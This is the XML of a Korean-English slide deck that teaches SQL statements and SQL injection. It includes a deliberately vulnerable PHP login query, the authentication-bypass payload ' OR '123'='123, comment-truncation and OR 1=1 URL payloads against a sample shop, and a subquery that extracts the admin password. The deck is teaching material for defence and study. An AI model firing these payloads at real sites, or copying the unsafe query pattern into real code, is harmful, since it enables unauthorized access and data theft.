0,-10 2-160 0 0,-17 16 4128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8711 9415 13439 0 0,'-4'9'3360'0'0,"2"2"-3360"0"0,7 4-640 0 0,15 0 640 0 0,17 1 384 0 0,24 3-160 0 0,23-3-96 0 0,20-3-128 0 0,13-4 32 0 0,8-4-32 0 0,5-7-64 0 0,7-7 64 0 0,1-7-544 0 0,-1-9-192 0 0,2-9-224 0 0,-5-8-672 0 0,-4-5-1056 0 0,-11-3-1760 0 0,-16-2-1184 0 0,-27 8 5632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8689 10546 3359 0 0,'13'13'8544'0'0,"9"13"-8320"0"0,13 15-224 0 0,18 18 64 0 0,18 12 352 0 0,14 7 160 0 0,14 3-32 0 0,12 1-64 0 0,9-1-32 0 0,9 0-96 0 0,10-7-96 0 0,7-6-256 0 0,9-6 0 0 0,8-5 0 0 0,3-4-416 0 0,3-6-480 0 0,4-7-672 0 0,2-10-1056 0 0,-7-6-2016 0 0,-31-7 4640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2023-01-01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insecure-website.com/products?category=Gift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insecure-website.com/products?category=Gifts'--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insecure-website.com/products?category=Gifts'+OR+1=1--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cors/same-origin-policy" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.youtube.com/watch?v=6QV_JpabO7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eamhack.io/wargame/challenges/1/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://dreamhack.io/wargame/challenges/24/" TargetMode="Externa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A2E59-50F5-485F-BBDB-58F2E8E5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SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Graphic 7" descr="Wind Chime">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24C822C9-D504-40AD-A79D-E94A6ACD5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163529"/>
            <a:ext cx="4001315" cy="400131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FA576-82EC-40DD-854C-C925E3EE3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spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
            </a:pPr>
            <a:fld id="{63C588AB-8E84-4C01-BDFA-16202E2AEB06}" type="slidenum">
              <a:rPr lang="en-US" altLang="ko-KR" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:pPr algn="r" defTabSz="914400">
                <a:spcAft>
                  <a:spcPts val="600"/>
                </a:spcAft>
              </a:pPr>
              <a:t>3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="ko-K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52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98A72-052D-48A4-A88C-4C769FE4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DDL (Data Definition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B6F81-11EC-42C8-9F56-802270FA5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CREATE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> TABLE Board(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idx</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> INT AUTO_INCREMENT,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boardTitle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> VARCHAR(100) NOT NULL,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err="1"/>
              <a:t>boardContent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> VARCHAR(2000) NOT NULL,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>	PRIMARY KEY(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>idx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8DAA19-BA34-4DF7-9279-933F9EBA5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95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143ED0-E88B-4646-BCAF-80538C35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DDL (Data Definition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3BF206-DBED-4283-AC87-2BB4ED3C6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ALTER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> TABLE Board </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>ADD</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>createdDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> date;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DROP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> TABLE Board;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F11F4-CE77-4684-9880-973C7C30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3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AC2B5-6C5F-464C-A1D4-B998E07E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DML(Data manipulation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ED9DBB-867D-412A-8686-C4CC0A749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43710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SELECT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dirty="0" err="1"/>
              <a:t>select_expr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> [, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>select_expr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>] ...</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>table_references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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>where_condition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SELECT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>uid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, title, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>boardcontent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>FROM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> boards </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>boardcontent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> like '%</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>abc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>%'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>ORDER BY </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>uid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> DESC LIMIT 5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67341C-F8AC-48C8-819D-5BFC3594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1954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5FD06E-842D-466A-80B4-9B6EB2D2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DML(Data manipulation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238329-2871-4D77-A55D-D03813E54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INSERT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INTO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> boards (title, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>boardcontent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VALUES</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> ('title 1', 'content 1'), ('title 2', 'content 2’);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INSERT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INTO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> boards (title, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>boardcontent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VALUES</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> ('title 1', </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>(select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0" err="1"/>
              <a:t>upw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t> from users where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0" err="1"/>
              <a:t>uid</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>='admin')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8CCCC0-FEBB-47D8-8F3F-9108174F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779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CE280-49B7-4A7E-A2F0-D7182798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DML(Data manipulation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6C17C-B285-4431-8B94-EF38FE17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UPDATE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> boards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SET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>boardcontent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> = "update content 2"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WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> title = 'title 1';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9192DE-4B9B-4A04-A65A-44549844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36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0F78D-0FD8-47C8-832A-9914B231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DML(Data manipulation language)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325F7-765C-432A-B863-E6E7DB48D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dirty="0"/>
              <a:t>DELETE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> FROM boards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" b="1" dirty="0"/>
              <a:t>WHERE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> title = 'title 1’;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삭제할 데이터의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>row</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 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C355FB-150C-43B7-B216-52708ADD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1596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99C5B-6597-4F6D-A328-072989C2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E48343-D828-4996-9241-1AF8DEEF2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Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 취약점 중 하나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데이터베이스 관리에 사용되는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SQL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통해 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>DB</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 접근할 때</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, SQL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>구문에 비정상적인 구문을 삽입하여 공격하는 기법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주로 클라이언트에서 서버로 전송하는 입력 값을 조작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Application </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>개발자는 올바르게 필터링</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이스케이프 하지 못하여 발생함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810DC8-7257-4577-A83D-5602E1D2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9577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728908-6274-4822-9680-02EEB70B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9EED6-E8C9-4274-84F7-337ADA7CF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A4601A-9413-467F-8532-3C94F31B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491" y="1925298"/>
            <a:ext cx="7171852" cy="378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97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id=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>admin&amp;pw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>=1234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{$pw}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에 들어갈 값은 사용자가 입력할 수 있음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66FB1-CCA0-46FA-9749-4C5C6A665C1A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1675772" y="2608729"/>
            <a:ext cx="89392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$query = "SELECT * FROM table WHERE id='admin' AND pw='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>{$pw}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>';"; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>$result = @mysqli_fetch_array( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>mysqli_query</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>( $con, $query ) ); </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>if ( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>isset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>( $result['id'] ) ) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>admin_login_ok</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>();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670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en-US" altLang="ko-KR" dirty="0">
                <a:ea typeface="a고딕12"/>
              </a:rPr>
              <a:t>SELECT * FROM table WHERE id='admin' AND pw='</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:ea typeface="a고딕12"/>
              </a:rPr>
              <a:t>' OR '123'='123</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:ea typeface="a고딕12"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:ea typeface="a고딕12"/>
              </a:rPr>
              <a:t>;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r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이 성공하여 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>admin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>pw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 몰라도 인증이 성공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&lt;id='admin' AND pw=''&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>혹은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>&lt;'123'='123'&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>일 때 조건이 참</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>(True)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506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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>시나리오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 사이트에서 사용자가 값을 전달할 수 있는 수단을 발견</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>$_GET, $_POST</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>상황에 따라서는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>$_FILE,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>$_SERVER</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 와 같은 곳에도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의심되는 곳에 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SQL Injection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이 가능한지 여부를 판단</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>Board.php?no</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>=3</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>Board.php?no</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>=4-1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>Board.php?no</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>=‘”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6893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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>시나리오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3. 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r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 목적</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>문의 결과를 조작</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>구문 변경</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Union based SQL Injection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데이터베이스의 정보를 획득</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Union</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>based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가시적일 경우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Sub Query (INSERT INTO table (name, age) VALUES (“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0" err="1"/>
              <a:t>hyomin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>”, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(SELECT ~~~~)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Blind</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r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injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Error based SQL Injection (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에러 메시지 이용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Time based SQL Injection  (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>동작 시간을 이용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데이터베이스의 정보를 조작</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>다중 구문이 허용되는 환경이라면</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>세미콜론으로 닫아주고 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>UPDATE, INSERT, DELETE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>등을 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Injection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440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Injection examples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Retrieving hidden data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t> 쿼리를 수정하여 추가 결과를 가져옴</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Subverting application logic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>논리적 결함을 만들어</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>, application</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>의 로직을 변경</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>UNION attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>다른 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Database table</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>data</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>를 가져옴</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>	</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Examining the database</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>데이터베이스 버전 및 구조에 대한 정보를 추출</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>Blind SQL injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>출력이 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t>response</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>로 반환되지 않을 때</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>이용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324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hidden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category</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>들을 표시하는 쇼핑몰을 생각해보자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https://insecure-website.com/products?category=Gifts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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>application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이 다음의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SQL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쿼리를 수행하여 제품을 검색함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products WHERE category = 'Gifts' AND released = 1</a:t>
            </a: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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>released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=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1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 은 아직 출시되지 않은 제품을 숨기기 위해 사용함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</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>released = 0 =&gt;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출시되지 않은 제품</a:t>
            </a:r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705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hidden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723"/>
            <a:ext cx="10745096" cy="4023360"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>공격자는 다음과 같은 공격을 구성할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https://insecure-website.com/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  <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>products?category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=Gifts’--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products WHERE category = 'Gifts'--' AND released = 1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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>--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는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SQL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의 주석임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이 뒤는 주석으로 해석됨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ko-KR" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333332"/>
                </a:solidFill>
                <a:latin typeface="Courier"/>
              </a:rPr>
              <a:t>따라서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AND released = 1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은 포함되지 않음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47147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hidden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723"/>
            <a:ext cx="10745096" cy="4023360"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/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en-US" altLang="ko-KR" dirty="0"/>
              <a:t>category</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
              <a:t>들을 표시하도록 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  <a:hlinkClick r:id="rId2"/>
